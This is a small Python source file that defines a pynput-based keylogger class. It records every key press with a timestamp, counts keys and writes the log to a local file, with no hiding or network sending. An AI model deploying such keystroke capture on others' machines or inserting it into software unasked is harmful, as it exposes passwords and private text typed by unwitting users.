import pynput
from pynput import keyboard
from datetime import datetime
#from threading import Timer


class KeyLogger:
    """
    Classe permettant de créer des keyloggers et de les contrôller
    """
    def __init__(self):
        """
        Un keylogger stock les logs d'inputs reçu dans une liste keys
        """
        self.keys = []

        self.listener = keyboard.Listener(on_press=self.on_press)

  
    def on_press(self,key):
            log = ( datetime.now().time(), key )
            self.keys.append(log)
    
    def CountKey(self):
        count = 0
        for key in self.keys:
            count +=1
        return count

    def getNumKeys(self,key):
        """
        return the number of a given key (parameter)
        """
        numKey = 0
        for i in self.keys:
            if key in str(i[1]):
                numKey +=1
        return numKey
       
     

    def write_on_file(self,filename):
            with open(filename,'w') as f:
                for key in self.keys:
                    f.write(str(key))
                    f.write("\n")
            f.close()

    def start(self):
        """
        permet de démarrer le keylogger
        """
        self.listener.start()

    def stop(self):
        """
        permet d'arrêter le keylogger
        """
        self.listener.stop()
